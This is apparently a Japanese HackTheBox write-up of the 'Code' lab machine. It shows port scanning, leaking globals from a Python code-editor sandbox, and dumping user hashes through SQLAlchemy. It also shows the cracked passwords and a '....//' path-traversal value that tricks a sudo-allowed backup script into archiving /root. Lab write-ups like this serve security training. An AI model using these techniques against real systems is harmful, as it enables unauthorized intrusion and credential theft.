---
title: 'Code - HTB'
description: 'HackTheBox Machine CodeのWriteupです。'
pubDate: 2025-12-20
category: 'HTB'
tags: ['HTB', 'Machine', 'Writeup', 'Linux', 'Web']
---

# Code - HTB

## Machine Information
| Title | Data |
| --- | --- |
| Machine | Code |
| Difficulty | Easy |
| Victim IP | 10.10.11.62 |
| My IP | 10.10.14.148 |

## Port Scanning
### 開いているポートを特定
```
nmap 10.10.11.62 -Pn

PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

### HTTPポートの詳細情報を特定
```
nmap 10.10.11.62 -Pn -p 5000 -A

PORT     STATE SERVICE VERSION
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
```

## Web Application Analysis
### 初期アクセス
`http://10.10.11.62:5000` にアクセスすると、Python のコードスニペットを実行できる Python Code Editor インターフェースが表示される。
### セキュリティテスト
最初にシステムコマンドの実行を試みたが、入力のサニタイズによりブロックされた。
`os.system()`、`subprocess`、`exec()` などの一般的なペイロードはフィルタリングされていた。\
Pythonのデバッグテクニックを使い、以下のコードを実行することでアプリケーション内部の情報を取得できた。
```
raise Exception(globals())
```
このコードの動作:\
globals() 関数は、現在の名前空間に存在するすべてのグローバル変数を辞書として返す。
その情報を例外として投げることで、アプリケーションの設定や利用可能なモジュールを確認できる。\

＊列挙した情報の中のデータベース操作に *SQLAlchemy* を使用していた。
### データベースの悪用
ユーザー列挙:
```
print(User.query.all())
```
スキーマの確認:
```
print(User.__table__.columns)
```
結果:
- `user.id`
- `user.username`
- `user.password`

データ抽出:
```
print([(user.id, user.username, user.password) for user in User.query.all()])
```
結果:
| Username | Hash Pass | Enc Pass(MD5) |
| --- | --- | --- |
| development | 759b74ce43947f5f4c91aeddc3e5bad3 | development |
| martin | 3de6f30c4a09c27fc71932bfc68474be | nafeelswordsmaster |

## Intrusion
### SSHアクセス
```
ssh martin@10.10.11.62
```
### Userフラグの取得
#### 利用可能な sudo 権限を確認
```
martin@code:~$ sudo -l

(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```
#### バックアップスクリプトを確認
<details><summary>back.sh</summary>

```
martin@code:~$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi
# パス検証が致命的
allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```
</details>

```
martin@code:~$ cat backups/task.json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/"
        ],

        "exclude": [
                ".*"
        ]
}
```
</details>
バックアップ設定を変更し、/home/app-production/ 全体を含め、バックアップを実行。

```
sudo /usr/bin/backy.sh task.json
```
結果:
- `code_home_app-production_2025_April.tar.bz2`が作成された。

#### 作成されたバックアップを展開

```
tar -xvjf code_home_app-production_2025_April.tar.bz2
```
結果:
- `home/app-production/user.txt`

### Rootフラグの取得
task.jsonのPathチェックを悪用して、実行。
```
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
```
```
sudo /usr/bin/backy.sh task.json
```
```
tar -xvjf code_var_.._root_2025_April.tar.bz2
```
結果:
- `/root/root.txt`